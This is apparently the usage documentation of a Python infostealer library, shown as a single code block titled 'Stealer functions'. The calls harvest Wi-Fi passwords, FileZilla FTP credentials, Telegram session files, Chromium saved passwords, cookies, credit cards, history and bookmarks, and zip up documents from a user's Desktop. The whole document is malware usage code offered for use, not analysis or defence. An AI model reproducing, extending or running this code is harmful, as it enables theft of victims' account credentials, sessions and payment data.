# Stealer functions

``` python
import Stealer.Wifi
import Stealer.FileZilla
import Stealer.Grabber
import Stealer.Telegeam
import Stealer.Chromium.Passwords
import Stealer.Chromium.Bookmarks
import Stealer.Chromium.Cookies
import Stealer.Chromium.CreditCards
import Stealer.Chromium.History

# Returns a list with dictionaries with your wifi passwords
wifi = Stealer.Wifi.StealWifiPasswords()
# Returns a list with dictionaries with your ftp servers passwords
filezilla = Stealer.FileZilla.Get()
# Grab all files from path and return .zip archive location
archive = Stealer.Grabber.Grab(path="C:\\Users\\Admin\\Desktop", archivePath="data.zip", maxsize=5242880, extensions=["txt", "doc", "pdf", "db"])
# Grab telegram session files and return .zip archive location
tdata = Stealer.Telegeam.Grab(archivePath="tdata.zip")
# Returns a list with dictionaries with your chrome passwords
passwords = Stealer.Chromium.Passwords.Get()
# Returns a list with dictionaries with your chrome bookmarks
bookmarks = Stealer.Chromium.Bookmarks.Get()
# Returns a list with dictionaries with your chrome cookies
cookies = Stealer.Chromium.Cookies.Get()
# Return string with cookies in NetScape format
netscapeCookies = Stealer.Chromium.Cookies.GetFormatted()
# Returns a list with dictionaries with your chrome credit cards
creditcards = Stealer.Chromium.CreditCards.Get()
# Returns a list with dictionaries with your chrome history
history = Stealer.Chromium.History.Get()
```